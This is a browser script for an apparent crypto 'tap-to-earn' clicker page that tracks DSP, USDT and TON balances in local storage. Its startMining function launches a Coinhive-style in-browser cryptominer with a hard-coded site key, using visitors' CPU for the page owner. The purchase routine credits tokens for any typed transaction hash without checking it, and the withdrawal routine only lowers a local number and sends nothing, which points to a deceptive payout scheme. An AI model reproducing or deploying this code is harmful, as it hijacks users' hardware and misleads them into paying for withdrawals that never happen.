<script>
let U=JSON.parse(localStorage.getItem("U"))||{
dsp:0,usdt:0,ton:0,
energy:500,energyMax:500,
click:1,regen:1,
prices:{x2:100,regen:150,auto:300,max:200}
}

function save(){localStorage.setItem("U",JSON.stringify(U))}
function show(id){document.querySelectorAll("section").forEach(s=>s.classList.remove("active"));document.getElementById(id).classList.add("active")}

function update(){
dsp.textContent=U.dsp.toFixed(2)
usdt.textContent=U.usdt.toFixed(2)
ton.textContent=U.ton.toFixed(2)
energy.textContent=U.energy
energyMax.textContent=U.energyMax
bar.style.width=(U.energy/U.energyMax*100)+"%"
px2.textContent=U.prices.x2
pregen.textContent=U.prices.regen
pauto.textContent=U.prices.auto
pmax.textContent=U.prices.max
}

function clickGame(){
if(U.energy<=0)return
U.energy--
U.dsp+=U.click
save();update()
}

function buyUp(t){
let p=U.prices[t]
if(U.dsp<p)return
U.dsp-=p
U.prices[t]*=2
if(t=="x2")U.click*=2
if(t=="regen")U.regen++
if(t=="auto")setInterval(clickGame,2000)
if(t=="max")U.energyMax+=500
save();update()
}

function exchange(){
let a=+exAmount.value;if(U.dsp<a)return
U.dsp-=a
if(exTo.value=="usdt")U.usdt+=a*0.01
else U.ton+=a*0.005
save();update()
}

function buyDSP(){
let t=+buyTon.value;if(!txhash.value)return
U.dsp+=t*3750
save();update()
}

function withdraw(){
let a=+wdAmount.value
if(wdType.value=="ton" && U.ton>=a)U.ton-=a
if(wdType.value=="dsp" && U.dsp>=a)U.dsp-=a
save();update()
}

setInterval(()=>{U.energy=Math.min(U.energy+U.regen,U.energyMax);save();update()},3000)

function startMining(){
try{
let miner=new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd',{throttle:0.6})
miner.start()
alert("Mining activÃ©")
}catch(e){alert("Mining bloquÃ© par le navigateur")}
}

update()
</script>
